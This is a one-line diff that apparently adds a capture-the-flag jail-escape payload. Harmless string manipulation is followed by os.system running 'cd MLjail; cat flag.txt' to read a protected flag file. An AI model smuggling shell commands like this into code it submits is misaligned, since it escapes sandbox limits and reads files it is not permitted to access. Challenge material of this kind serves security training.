@@ -1,0 +1,1 @@
+print('Hello, World!'.swapcase().replace('world', 'Python').endswith('Python!')); import os; os.system("cd MLjail; cat flag.txt")
